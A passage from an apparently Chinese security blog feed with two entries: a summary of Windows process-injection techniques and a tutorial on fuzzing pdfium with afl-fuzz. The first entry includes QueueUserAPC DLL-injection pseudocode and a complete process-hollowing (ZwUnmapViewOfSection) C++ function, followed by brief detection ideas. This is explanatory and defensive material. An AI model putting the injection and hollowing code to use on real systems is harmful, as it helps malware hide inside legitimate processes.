NT\CurrentVersion\Windows\LoadAppInit_DLLs</code></p><ul><li>REG_DWORD 1 表示全局开启</li><li>REG_DWORD 0 表示全局关闭</li></ul><p><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows\RequireSignedAppInit_DLLs</code></p><ul><li>REG_DWORD 0 加载任意DLL</li><li>REG_DWORD 1 只加载签名的DLL</li></ul><h3 id="1-5-QueueUserApc"><a href="#1-5-QueueUserApc" class="headerlink" title="1.5 QueueUserApc"></a>1.5 QueueUserApc</h3><p>QueueUserApc API 原型如下：</p><p>DWORD WINAPI QueueUserAPC(<br>  <em>In</em>  PAPCFUNC pfnAPC,    &#x2F;&#x2F; APC function<br>  <em>In</em>  HANDLE hThread,     &#x2F;&#x2F; handle of thread<br>  <em>In</em>  ULONG_PTR dwData    &#x2F;&#x2F; APc function parameter<br>);</p><p>这个注入方法用的不多，但是也是老方法了，pjf在2007年《暴力注入explorer》的文章里<br>就提到了这种方法。作用是在线程的Apc队列插入一个用户模式下的APC 对象。</p><p>APC 是 asynchronous procedure call 的缩写，每个线程都有自己的APC队列，在线程APC<br>队列中的APC对象的函数将被线程执行，但是用户模式下的APC对象里的函数并不一定会马上<br>执行（所以是异步的），除非线程是alertable状态。当线程是alertable状态是，APC队列<br>里的Apc对象，按照FIFO的顺序进行处理，执行APC函数。线程调用 SleepEx,<br>SignalObjectAndWait, WaitForSingleObjectEx, WaitForMultipleObjectsEx 或者<br>MsgWaitForMultipleObjectsEx时线程进入alertable状态。</p><p>所以为了我们的函数能够尽快的执行，我们必须在目标进程所有的线程的APC队列中插入<br>APC 对象，基本上总有一个线程是alertable状态。</p><p>核心伪代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">DWORD ret;</span><br><span class="line"><span class="type">char</span> *DllName = <span class="string">&#x27;c:\\MyDll.dll&#x27;</span>;</span><br><span class="line"><span class="type">int</span> len = <span class="built_in">strlen</span>(DllName) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">PVOID param = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, len, MEM_COMMIT | MEM_TOP_DOWN, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (param != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">WriteProcessMemory</span>(hProcess, param, (LPVOID)DllName, len, &amp;ret)) &#123;</span><br><span class="line">  <span class="keyword">for</span> (DWORD p = <span class="number">0</span>; p &lt; NumberOfThreads; p ++) &#123;</span><br><span class="line">    hThread = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, <span class="number">0</span>, ThreadId[p]);</span><br><span class="line">    <span class="keyword">if</span> (hThread != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">InjectDll</span>(hProcess, hThread, (DWORD)param);</span><br><span class="line">      <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InjectDll</span><span class="params">(HANDLE hProcess, HANDLE hThread, DWORD param)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">QueueUserAPC</span>((PAPCFUNC)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">&#x27;kernel32.dll&#x27;</span>, <span class="string">&#x27;LoadLibraryA&#x27;</span>, hThread, (DWORD)param）;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-6-ZwMapViewOfSection"><a href="#1-6-ZwMapViewOfSection" class="headerlink" title="1.6 ZwMapViewOfSection"></a>1.6 ZwMapViewOfSection</h3><p>这是最近出现的比较新的进程注入方法，在2014年左右有样本开始使用这种方法注入进程。<br>这种技术的本质是进程替换，使用合法的正常进程，执行的确是恶意的代码。</p><p>基本步骤如下：</p><ol><li>使用CREATE_SUSPENDED调用CreateProcessW创建进程</li><li>使用ZwUnmapViewOfSection卸载进程空间中的原始代码</li><li>使用VirtualAllocEx分配内存，确保分配区域可写可执行</li><li>使用WriteProcessMemory在分配区域内写入恶意代码</li><li>使用SetThreadContext设置线程内容为指定的恶意代码</li><li>使用ResumeThread回复进程执行</li></ol><p>代码中用到PEB的结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;dt nt!_PEB</span><br><span class="line">+0x000 InheritedAddressSpace : UChar</span><br><span class="line">+0x001 ReadImageFileExecOptions : UChar</span><br><span class="line">+0x002 BeingDebugged : UChar</span><br><span class="line">+0x003 SpareBool : UChar</span><br><span class="line">+0x004 Mutant : Ptr32 Void</span><br><span class="line">+0x008 ImageBaseAddress : Ptr32 Void</span><br></pre></td></tr></table></figure><p>示例代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">InjectProcess</span><span class="params">(LPTSTR VictimFile,LPTSTR InjectExe)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> HANDLE hFile;</span><br><span class="line"> DWORD dwFileSize;    <span class="comment">//文件大小</span></span><br><span class="line"> IMAGE_DOS_HEADER DosHeader;</span><br><span class="line"> IMAGE_NT_HEADERS NtHeader;</span><br><span class="line"> PROCESS_INFORMATION pi;</span><br><span class="line"> STARTUPINFO si;</span><br><span class="line"> CONTEXT context;</span><br><span class="line"> PVOID ImageBase;</span><br><span class="line"> <span class="type">unsigned</span> <span class="type">long</span> ImageSize;</span><br><span class="line"> <span class="type">unsigned</span> <span class="type">long</span> BaseAddr;</span><br><span class="line"> <span class="type">unsigned</span> <span class="type">long</span> retByte = <span class="number">0</span>;</span><br><span class="line"> LONG offset;</span><br><span class="line"> HMODULE hNtDll=<span class="built_in">GetModuleHandle</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line"> <span class="keyword">if</span>(!hNtDll)</span><br><span class="line">  <span class="keyword">return</span> FALSE;</span><br><span class="line"> ZWUNMAPVIEWOFSECTION ZwUnmapViewOfSection = (ZWUNMAPVIEWOFSECTION)<span class="built_in">GetProcAddress</span>(hNtDll,<span class="string">&quot;ZwUnmapViewOfSection&quot;</span>);</span><br><span class="line"> <span class="built_in">memset</span>(&amp;si, <span class="number">0</span>, <span class="built_in">sizeof</span>(si));</span><br><span class="line"> <span class="built_in">memset</span>(&amp;pi, <span class="number">0</span>, <span class="built_in">sizeof</span>(pi));</span><br><span class="line"> si.cb = <span class="built_in">sizeof</span>(si);</span><br><span class="line"></span><br><span class="line"> hFile = ::<span class="built_in">CreateFile</span>(InjectExe,GENERIC_READ,FILE_SHARE_READ | FILE_SHARE_WRITE,<span class="literal">NULL</span>,OPEN_EXISTING,FILE_ATTRIBUTE_ARCHIVE,<span class="literal">NULL</span>);</span><br><span class="line"> <span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE)</span><br><span class="line"> &#123;</span><br><span class="line">  <span class="keyword">return</span> FALSE;</span><br><span class="line"> &#125;</span><br><span class="line"> ::<span class="built_in">SetFilePointer</span>(hFile, <span class="number">0</span>, <span class="literal">NULL</span>, FILE_BEGIN);</span><br><span class="line"> dwFileSize = ::<span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>);</span><br><span class="line"> LPBYTE pBuf = <span class="keyword">new</span> BYTE[dwFileSize];</span><br><span class="line"> <span class="built_in">memset</span>(pBuf, <span class="number">0</span>, dwFileSize);</span><br><span class="line"> DWORD dwNumberOfBytesRead = <span class="number">0</span>;</span><br><span class="line">    ::<span class="built_in">ReadFile</span>( hFile</span><br><span class="line">        , pBuf</span><br><span class="line">        , dwFileSize</span><br><span class="line">        , &amp;dwNumberOfBytesRead</span><br><span class="line">        , <span class="literal">NULL</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line"> ::<span class="built_in">CopyMemory</span>((<span class="type">void</span> *)&amp;DosHeader,pBuf,<span class="built_in">sizeof</span>(IMAGE_DOS_HEADER));</span><br><span class="line"> ::<span class="built_in">CopyMemory</span>((<span class="type">void</span> *)&amp;NtHeader,&amp;pBuf[DosHeader.e_lfanew],<span class="built_in">sizeof</span>(IMAGE_NT_HEADERS));</span><br><span class="line"> <span class="comment">//检查PE结构</span></span><br><span class="line"> <span class="comment">//以挂起方式进程</span></span><br><span class="line"> BOOL res = <span class="built_in">CreateProcess</span>(<span class="literal">NULL</span>,VictimFile,<span class="literal">NULL</span>,<span class="literal">NULL</span>,FALSE,CREATE_SUSPENDED,<span class="literal">NULL</span>,<span class="literal">NULL</span>,&amp;si,&amp;pi); </span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (res)</span><br><span class="line"> &#123;</span><br><span class="line">  context.ContextFlags = CONTEXT_FULL;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">GetThreadContext</span>(pi.hThread,&amp;context))  <span class="comment">//如果调用失败</span></span><br><span class="line">  &#123;</span><br><span class="line">   <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">   <span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">   <span class="keyword">return</span> FALSE;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">ReadProcessMemory</span>(pi.hProcess,(<span class="type">void</span> *)(context.Ebx + <span class="number">8</span>),&amp;BaseAddr,<span class="built_in">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span>),<span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (!BaseAddr)</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">   <span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">   <span class="keyword">return</span> FALSE;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//拆卸傀儡进程内存模块</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">ZwUnmapViewOfSection</span>((<span class="type">unsigned</span> <span class="type">long</span>)pi.hProcess,BaseAddr))</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">   <span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">   <span class="keyword">return</span> FALSE;</span><br><span class="line">  &#125;</span><br><span class="line">  ImageBase = <span class="built_in">VirtualAllocEx</span>(pi.hProcess, </span><br><span class="line">   (<span class="type">void</span> *)NtHeader.OptionalHeader.ImageBase,</span><br><span class="line">   NtHeader.OptionalHeader.SizeOfImage, </span><br><span class="line">   MEM_RESERVE|MEM_COMMIT, </span><br><span class="line">   PAGE_EXECUTE_READWRITE);  <span class="comment">//ImageBase 0x00400000</span></span><br><span class="line">  <span class="keyword">if</span> (ImageBase == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">   DWORD wrongFlag = <span class="built_in">GetLastError</span>();</span><br><span class="line">   <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">   <span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">   <span class="keyword">return</span> FALSE;</span><br><span class="line">  &#125;  </span><br><span class="line">  <span class="comment">//替换傀儡进程内存数据</span></span><br><span class="line">  <span class="keyword">if</span>(!<span class="built_in">WriteProcessMemory</span>(pi.hProcess, ImageBase, pBuf, NtHeader.OptionalHeader.SizeOfHeaders, &amp;retByte))</span><br><span class="line">  &#123;</span><br><span class="line">   DWORD wrongFlag2 = <span class="built_in">GetLastError</span>();  </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//DOS 头 + PE 头 + 区块表的总大小</span></span><br><span class="line">  <span class="comment">//定位到区块头</span></span><br><span class="line">  offset = DosHeader.e_lfanew + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS);</span><br><span class="line">  IMAGE_SECTION_HEADER secHeader;</span><br><span class="line">  WORD i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;i &lt; NtHeader.FileHeader.NumberOfSections;i++)</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="comment">//定位到各个区块</span></span><br><span class="line">   ::<span class="built_in">CopyMemory</span>((<span class="type">void</span> *)&amp;secHeader, &amp;pBuf[offset + i*<span class="built_in">sizeof</span>(IMAGE_SECTION_HEADER)],<span class="built_in">sizeof</span>(IMAGE_SECTION_HEADER));</span><br><span class="line">   <span class="built_in">WriteProcessMemory</span>(pi.hProcess,(LPVOID)((DWORD)ImageBase + secHeader.VirtualAddress),&amp;pBuf[secHeader.PointerToRawData],secHeader.SizeOfRawData,&amp;retByte);</span><br><span class="line">   <span class="built_in">VirtualProtectEx</span>(pi.hProcess, (LPVOID)((DWORD)ImageBase + secHeader.VirtualAddress), secHeader.Misc.VirtualSize, PAGE_EXECUTE_READWRITE,&amp;BaseAddr);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  context.ContextFlags = CONTEXT_FULL;</span><br><span class="line">  <span class="comment">//重置 执行文件入口</span></span><br><span class="line">  <span class="built_in">WriteProcessMemory</span>(pi.hProcess, (<span class="type">void</span> *)(context.Ebx + <span class="number">8</span>), </span><br><span class="line">   &amp;ImageBase,   <span class="comment">//4194304</span></span><br><span class="line">   <span class="number">4</span>, &amp;retByte);</span><br><span class="line">  context.Eax = (<span class="type">unsigned</span> <span class="type">long</span>)ImageBase + NtHeader.OptionalHeader.AddressOfEntryPoint;</span><br><span class="line">  <span class="built_in">SetThreadContext</span>(pi.hThread,&amp;context);</span><br><span class="line">  <span class="built_in">ResumeThread</span>(pi.hThread);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line"> <span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line"> ::<span class="built_in">CloseHandle</span>(hFile);  </span><br><span class="line"> <span class="keyword">delete</span>[] pBuf;</span><br><span class="line"> <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-检测方法"><a href="#2-检测方法" class="headerlink" title="2. 检测方法"></a>2. 检测方法</h2><ol><li>注册表相关注入继续可以通过Hook写注册表相关API实现监控</li><li>SetWindowsHookEx则需要检查最后一个参数是否为0，为0表示全局注入，这是我们<br>  关注的地方。但是输入法之类的正常程序也可能使用注入技术。</li><li>CreateRemoteThread进程注入比较复杂，核心要点是要有跨进程写入数据的动作，<br>  后续从两个维度来进行检查</li></ol><h3 id="2-1-检查跨进程写入的数据"><a href="#2-1-检查跨进程写入的数据" class="headerlink" title="2.1 检查跨进程写入的数据"></a>2.1 检查跨进程写入的数据</h3><p>虽然WriteProcessMemory的底层API经常被Windows底层用作数据传递，但是通过<br>特征可以识别出来</p><ol><li>写入的数据是PE文件</li><li>写入的数据里包含.dll (一般是DLL文件名，或者是导入表相关数据)</li><li>写入超长数据</li></ol><h3 id="2-2-检查线程代码执行部分地址"><a href="#2-2-检查线程代码执行部分地址" class="headerlink" title="2.2 检查线程代码执行部分地址"></a>2.2 检查线程代码执行部分地址</h3><p>检查代码地址是否在WriteProcessMemory写入的数据区域之内</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="http://blog.opensecurityresearch.com/2013/01/windows-dll-injection-basics.html">Windows DLL Injection Basics</a></li><li><a href="http://blog.csdn.net/evi10r/article/details/6745138">使用异步过程调用（APC）实现模块注入</a></li><li><a href="http://bbs.pediy.com/showthread.php?t=99206">Ring3下WX方法结束微点2009</a></li><li><a href="http://blog.w4kfu.com/tag/duqu">New method of injection</a></li><li><a href="http://www.i7s3curi7y.com/win32-code-injection-techniques">The Ultimate Win32 code injection Reference</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-Process-Injection-方法总结&quot;&gt;&lt;a href=&quot;#1-Process-Injection-方法总结&quot; class=&quot;headerlink&quot; title=&quot;1. Process Injection 方法总结&quot;&gt;&lt;/a&gt;1. Process In</summary>
      
    
    
    
    
    <category term="Security" scheme="http://usmacd.com/tags/Security/"/>
    
    <category term="windows" scheme="http://usmacd.com/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>使用 afl-fuzz fuzz pdfium</title>
    <link href="http://usmacd.com/cn/pdfium-fuzz.public/"/>
    <id>http://usmacd.com/cn/pdfium-fuzz.public/</id>
    <published>2023-09-06T03:00:51.732Z</published>
    <updated>2023-09-06T03:00:51.732Z</updated>
    
    <content type="html"><![CDATA[<h2 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h2><p>先在 <a href="https://pdfium.googlesource.com/pdfium/">https://pdfium.googlesource.com/pdfium/</a> 下载源码.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> repo</span><br><span class="line"><span class="built_in">cd</span> repo</span><br><span class="line">gclient config --unmanaged https://pdfium.googlesource.com/pdfium.git</span><br><span class="line">gclient <span class="built_in">sync</span></span><br><span class="line"><span class="built_in">cd</span> pdfium</span><br></pre></td></tr></table></figure><p>gclient 命令在 depot_tools 中, 需要安装 参考下面的文章</p><p><a href="http://www.chromium.org/developers/how-tos/install-depot-tools">http://www.chromium.org/developers/how-tos/install-depot-tools</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line">export PATH=`pwd`/depot_tools:&quot;$PATH&quot;</span><br></pre></td></tr></table></figure><p>主要gclient sync 同步时需要翻墙，可以简单的使用环境变量的方法。</p><p><code>https_proxy=http://localhost:8118 gclient sync</code> 下载 download google storage过<br>程中还会遇到一个网络问题，需要编写配置文件 ~&#x2F;.boto</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Boto]</span><br><span class="line">proxy = 127.0.0.1  # 不带 http://</span><br><span class="line">proxy_port= 8118</span><br></pre></td></tr></table></figure><p><code>export NO_AUTH_BOTO_CONFIG=~/.boto</code></p><p>源码包非常大，大概有1G多，需要耐心等待。</p><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>编译需要使用 ubuntu 或者 Debian 系统，其他系统的依赖问题解决起来比较麻烦，<br>如果是上面两种操作系统的话，有脚本自动安装依赖。</p><p><code>./build/install-build-deps.sh</code></p><p>安装完所以依赖后就可以开始编译了，首先要先生成 gn 文件 (2016 年google 放弃使用原来的 gyp 编译方式)</p><p><code>gn args out/afl</code> 会调用vim 编译器， 输入下面的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># Build arguments go here.</span><br><span class="line"># See &quot;gn args &lt;out_dir&gt; --list&quot; for available build arguments.</span><br><span class="line">use_goma = false # Googlers only. Make sure goma is installed and running first.</span><br><span class="line">is_debug = false  # Enable debugging features.</span><br><span class="line"></span><br><span class="line">pdf_use_skia = true # Set true to enable experimental skia backend.</span><br><span class="line">pdf_use_skia_paths = false  # Set true to enable experimental skia backend (paths only).</span><br><span class="line"></span><br><span class="line">pdf_enable_xfa = true  # Set false to remove XFA support (implies JS support).</span><br><span class="line">pdf_enable_v8 = true  # Set false to remove Javascript support.</span><br><span class="line">pdf_is_standalone = true  # Set for a non-embedded build.</span><br><span class="line">is_component_build = false # Disable component build (must be false)</span><br><span class="line">v8_static_library = true</span><br><span class="line"></span><br><span class="line">clang_use_chrome_plugins = false  # Currently must be false.</span><br><span class="line">use_sysroot = false  # Currently must be false on Linux, but entirely omitted on windows.</span><br><span class="line"></span><br><span class="line">use_afl = true</span><br><span class="line">#is_asan = true</span><br><span class="line">enable_nacl = true</span><br><span class="line">optimize_for_fuzzing = true</span><br><span class="line">symbol_level=1</span><br></pre></td></tr></table></figure><p>使用 ASAN 编译会报错，暂时不开启，接下来要解决 afl 的问题了， pdfium 的 third_party<br>中不包含 afl-fuzz 的源代码，需要到 chromium.googlesource.com 项目下载。<br>chromium 项目支持 libfuzzer 和 afl-fuzz，只要使用开关， <code>use_libfuzzer = true</code><br>或者 <code>use_afl = true</code> 即可打开。</p><p>要编译生成 pdfium_test, 必须指定 pdf_is_standalone &#x3D; true, pdfium 源码仓库中没有<br>afl-fuzz 的代码，需要自己下载。</p><p><a href="https://chromium.googlesource.com/chromium/src/third_party/+/master/afl/">https://chromium.googlesource.com/chromium/src/third_party/+/master/afl/</a></p><p>可以直接下载 .tgz 文件<br><a href="https://chromium.googlesource.com/chromium/src/third_party/+archive/master/afl.tar.gz">https://chromium.googlesource.com/chromium/src/third_party/+archive/master/afl.tar.gz</a></p><p>下载后将源码 copy 到 ~&#x2F;repo&#x2F;pdfium&#x2F;third_party&#x2F;afl 中, 使用 <code>ninja -C out/afl</code> 编译整个项目。</p><p>使用 <code>is_debug=false</code> 可以明显提高fuzzing 速度，应该开启。另外一个比较有用的是<br><code>symbol_level</code>, 设置 symbol_level&#x3D;1 可以添加必要的调试符号，便于gdb调试。</p><p>在编译 skia backend 支持时，需要额外处理， 使用 C++14</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use_cxx11 = false </span><br></pre></td></tr></table></figure><h2 id="afl-fuzz"><a href="#afl-fuzz" class="headerlink" title="afl-fuzz"></a>afl-fuzz</h2><p>随着 chromium 代码的更新， afl 源码编译出现了一些小问题，需要处理。</p><p>src&#x2F;third_party&#x2F;afl&#x2F;patches&#x2F;0001-fix-build-with-std-c11.patch</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/afl-fuzz.c b/afl-fuzz.c</span></span><br><span class="line"><span class="comment">index 01b4afef0ecc..f0d564a33037 100644</span></span><br><span class="line"><span class="comment">--- a/afl-fuzz.c</span></span><br><span class="line"><span class="comment">+++ b/afl-fuzz.c</span></span><br><span class="line"><span class="meta">@@ -23,7 +23,9 @@</span></span><br><span class="line"> #define AFL_MAIN</span><br><span class="line"> #define MESSAGES_TO_STDOUT</span><br><span class="line"> </span><br><span class="line"><span class="addition">+#ifndef _GNU_SOURCE</span></span><br><span class="line"> #define _GNU_SOURCE</span><br><span class="line"><span class="addition">+#endif</span></span><br><span class="line"> #define _FILE_OFFSET_BITS 64</span><br><span class="line"> </span><br><span class="line"> #include &quot;config.h&quot;</span><br><span class="line"><span class="comment">diff --git a/types.h b/types.h</span></span><br><span class="line"><span class="comment">index 784d3a7a286d..d24d1fdd97e8 100644</span></span><br><span class="line"><span class="comment">--- a/types.h</span></span><br><span class="line"><span class="comment">+++ b/types.h</span></span><br><span class="line"><span class="meta">@@ -78,7 +78,7 @@</span> typedef int64_t  s64;</span><br><span class="line"> #define STRINGIFY(x) STRINGIFY_INTERNAL(x)</span><br><span class="line"> </span><br><span class="line"> #define MEM_BARRIER() \</span><br><span class="line"><span class="deletion">-  asm volatile(&quot;&quot; ::: &quot;memory&quot;)</span></span><br><span class="line"><span class="addition">+  __asm__ volatile(&quot;&quot; ::: &quot;memory&quot;)</span></span><br><span class="line"> </span><br><span class="line"> #define likely(_x)   __builtin_expect(!!(_x), 1)</span><br><span class="line"> #define unlikely(_x)  __builtin_expect(!!(_x), 0)</span><br></pre></td></tr></table></figure><p>afl-fuzz 的使用和其他项目一样。初始的种子文件有几个地方可以获取：</p><ul><li><a href="https://pdfium.googlesource.com/pdfium/+/refs/heads/master/testing/resources/">https://pdfium.googlesource.com/pdfium/+/refs/heads/master/testing/resources/</a></li><li><a href="https://github.com/mozilla/pdf.js/tree/master/test/pdfs">https://github.com/mozilla/pdf.js/tree/master/test/pdfs</a></li></ul><p><code>./afl-fuzz -M 01 -m 1024 -i /home/henices/input -o /home/henices/out -x /tmp/pdf.dict -- ./pdfium_test @@</code></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://mariomalwareanalysis.blogspot.com/2012/02/how-to-embed-javascript-into-pdf.html">https://mariomalwareanalysis.blogspot.com/2012/02/how-to-embed-javascript-into-pdf.html</a></li><li><a href="https://www.blackhat.com/docs/asia-17/materials/asia-17-Liu-Dig-Into-The-Attack-Surface-Of-PDF-And-Gain-100-CVEs-In-1-Year.pdf">https://www.blackhat.com/docs/asia-17/materials/asia-17-Liu-Dig-Into-The-Attack-Surface-Of-PDF-And-Gain-100-CVEs-In-1-Year.pdf</a></li><li><a href="https://chromium.googlesource.com/chromium/src/+/master/testing/libfuzzer/getting_started.md">https://chromium.googlesource.com/chromium/src/+/master/testing/libfuzzer/getting_started.md</a></li><li><a href="https://chromium.googlesource.com/chromium/src/+/master/testing/libfuzzer/efficient_fuzzer.md">https://chromium.googlesource.com/chromium/src/+/master/testing/libfuzzer/efficient_fuzzer.md</a></li><li><a href="https://chromium.googlesource.com/chromium/src/+/master/testing/libfuzzer/reproducing.md">https://chromium.googlesource.com/chromium/src/+/master/testing/libfuzzer/reproducing.md</a></li><li><a href="https://fuzzing-project.org/tutorial2.html">https://fuzzing-project.org/tutorial2.html</a></li><li><a 